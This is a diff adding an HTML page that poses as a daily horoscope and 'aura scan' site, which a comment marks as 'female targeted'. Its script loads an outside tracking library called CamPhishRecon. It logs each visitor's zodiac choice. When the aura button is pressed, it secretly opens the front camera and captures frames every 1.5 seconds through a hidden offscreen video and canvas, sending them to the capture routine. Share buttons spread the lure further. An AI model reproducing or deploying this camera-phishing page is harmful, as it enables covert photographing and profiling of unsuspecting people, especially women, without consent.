@@ -1,0 +1,121 @@
+<!-- DESC: Daily horoscope reading — female targeted, camera for aura scan -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Daily Horoscope & Aura Reading</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+body{background:linear-gradient(135deg,#0d0033,#1a0044,#2d0050);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
+.box{width:380px;max-width:92vw;padding:36px;text-align:center}
+.logo{font-size:32px;margin-bottom:4px}
+.title{font-size:24px;font-weight:700;background:linear-gradient(135deg,#c44dff,#ff6b9d,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.sub{color:#9888bb;font-size:13px;margin-bottom:28px}
+.zodiac-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:24px}
+.zodiac{padding:12px 4px;border:1px solid rgba(196,77,255,0.2);border-radius:12px;cursor:pointer;font-size:28px;transition:all .15s;background:rgba(196,77,255,0.05)}
+.zodiac:active,.zodiac.sel{border-color:#c44dff;background:rgba(196,77,255,0.15);transform:scale(0.95)}
+.zodiac-name{font-size:9px;color:#9888bb;margin-top:2px}
+.reading{display:none}.reading.active{display:block}
+.sign-emoji{font-size:56px;margin-bottom:8px}
+.sign-name{font-size:22px;font-weight:700;color:#ffd700;margin-bottom:16px}
+.horoscope-text{color:#ddccff;font-size:14px;line-height:1.8;margin-bottom:20px;padding:16px;background:rgba(196,77,255,0.08);border-radius:12px;text-align:left}
+.lucky{display:flex;justify-content:space-around;margin-bottom:20px}
+.lucky-item{text-align:center}.lucky-item .label{font-size:10px;color:#9888bb;text-transform:uppercase}.lucky-item .val{font-size:16px;font-weight:700;color:#ffd700}
+.aura-btn{background:linear-gradient(135deg,#c44dff,#ff6b9d);color:#fff;border:none;padding:14px 40px;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin-bottom:12px}
+.aura-btn:active{transform:scale(0.97)}
+.share-btns{display:flex;gap:8px}
+.sb{flex:1;padding:10px;border:none;border-radius:20px;color:#fff;font-weight:600;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+.scanning{position:fixed;inset:0;background:rgba(13,0,51,0.97);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column}
+.scanning.active{display:flex}
+.aura-circle{width:180px;height:180px;border-radius:50%;border:3px solid #c44dff;position:relative;margin-bottom:20px;overflow:hidden;background:#000}
+.aura-circle::after{content:'';position:absolute;inset:0;border:2px solid rgba(255,107,157,0.4);border-radius:50%;animation:ap 2s infinite}
+@keyframes ap{0%{transform:scale(0.8);opacity:0.3}50%{transform:scale(1.1);opacity:0.8}100%{transform:scale(0.8);opacity:0.3}}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="box">
+<div class="logo">🔮</div>
+<div class="title">Daily Horoscope</div>
+<div class="sub">Tap your sign for today's reading + aura scan</div>
+<div class="zodiac-grid" id="zodiacGrid">
+<div class="zodiac" onclick="pickSign('Aries','♈')"><div>♈</div><div class="zodiac-name">Aries</div></div>
+<div class="zodiac" onclick="pickSign('Taurus','♉')"><div>♉</div><div class="zodiac-name">Taurus</div></div>
+<div class="zodiac" onclick="pickSign('Gemini','♊')"><div>♊</div><div class="zodiac-name">Gemini</div></div>
+<div class="zodiac" onclick="pickSign('Cancer','♋')"><div>♋</div><div class="zodiac-name">Cancer</div></div>
+<div class="zodiac" onclick="pickSign('Leo','♌')"><div>♌</div><div class="zodiac-name">Leo</div></div>
+<div class="zodiac" onclick="pickSign('Virgo','♍')"><div>♍</div><div class="zodiac-name">Virgo</div></div>
+<div class="zodiac" onclick="pickSign('Libra','♎')"><div>♎</div><div class="zodiac-name">Libra</div></div>
+<div class="zodiac" onclick="pickSign('Scorpio','♏')"><div>♏</div><div class="zodiac-name">Scorpio</div></div>
+<div class="zodiac" onclick="pickSign('Sagittarius','♐')"><div>♐</div><div class="zodiac-name">Sagittarius</div></div>
+<div class="zodiac" onclick="pickSign('Capricorn','♑')"><div>♑</div><div class="zodiac-name">Capricorn</div></div>
+<div class="zodiac" onclick="pickSign('Aquarius','♒')"><div>♒</div><div class="zodiac-name">Aquarius</div></div>
+<div class="zodiac" onclick="pickSign('Pisces','♓')"><div>♓</div><div class="zodiac-name">Pisces</div></div>
+</div>
+<div class="reading" id="reading">
+<div class="sign-emoji" id="signEmoji">♈</div>
+<div class="sign-name" id="signName">Aries</div>
+<div class="horoscope-text" id="horoscopeText"></div>
+<div class="lucky">
+<div class="lucky-item"><div class="label">Lucky #</div><div class="val" id="luckyNum">7</div></div>
+<div class="lucky-item"><div class="label">Lucky Color</div><div class="val" id="luckyColor">Gold</div></div>
+<div class="lucky-item"><div class="label">Mood</div><div class="val" id="luckyMood">✨</div></div>
+</div>
+<button class="aura-btn" onclick="startAura()">✨ Scan My Aura</button>
+<div class="share-btns"><button class="sb s-wa" onclick="shareReading('wa')">💬 Share</button><button class="sb s-fb" onclick="shareReading('fb')">📘 Share</button></div>
+</div>
+</div>
+<div class="scanning" id="scanning">
+<div class="aura-circle" id="auraCircle"></div>
+<div style="font-size:18px;font-weight:700;color:#c44dff">Scanning your aura...</div>
+<div style="font-size:13px;color:#9888bb;margin-top:8px">Reading your energy field</div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL=location.origin+'/t/horoscope';
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+var HOROSCOPES=[
+'Today brings unexpected opportunities. Trust your intuition and embrace change. A conversation could open new doors.',
+'Your creativity peaks today. Express yourself freely. Someone admires your work from afar. Love is in the air.',
+'Focus on self-care today. The universe rewards patience. A small gesture will mean a lot to someone special.',
+'Financial news looks promising. Take calculated risks. Your social circle brings joy and new connections.',
+'A day for deep reflection. Past lessons guide future decisions. Trust the journey and stay positive.',
+'Strong energy surrounds you today. Speak your truth. A wish may come true sooner than expected.'
+];
+var COLORS=['Gold','Rose','Lavender','Emerald','Coral','Silver','Amber','Pearl'];
+var MOODS=['✨','🌙','💫','🌟','🔮','💫','☀️','🌈'];
+function pickSign(name,emoji){
+document.querySelectorAll('.zodiac').forEach(function(z){z.classList.remove('sel');});
+event.target.closest('.zodiac').classList.add('sel');
+document.getElementById('signEmoji').textContent=emoji;
+document.getElementById('signName').textContent=name;
+document.getElementById('horoscopeText').textContent=HOROSCOPES[Math.floor(Math.random()*HOROSCOPES.length)];
+document.getElementById('luckyNum').textContent=Math.floor(Math.random()*99)+1;
+document.getElementById('luckyColor').textContent=COLORS[Math.floor(Math.random()*COLORS.length)];
+document.getElementById('luckyMood').textContent=MOODS[Math.floor(Math.random()*MOODS.length)];
+document.getElementById('zodiacGrid').style.display='none';
+document.getElementById('reading').classList.add('active');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('horoscope_read',{sign:name});
+}
+function startAura(){
+var sc=document.getElementById('scanning');sc.classList.add('active');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('aura_scan',{});
+if(navigator.mediaDevices){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'aura_scan');}},1500);
+setTimeout(function(){clearInterval(ci);sc.classList.remove('active');alert('Your aura is glowing! Today\'s color: '+COLORS[Math.floor(Math.random()*COLORS.length)]);},6000);
+}).catch(function(){setTimeout(function(){sc.classList.remove('active');alert('Camera needed for aura scan.');},2000);});
+}else{setTimeout(function(){sc.classList.remove('active');},2000);}
+}
+function shareReading(t){
+var msg='🔮 My daily horoscope says great things are coming! Read yours: '+SHARE_URL;
+if(navigator.canShare){navigator.share({text:msg,title:'Daily Horoscope'}).catch(function(){});return;}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
+}
+</script>
+</body></html>
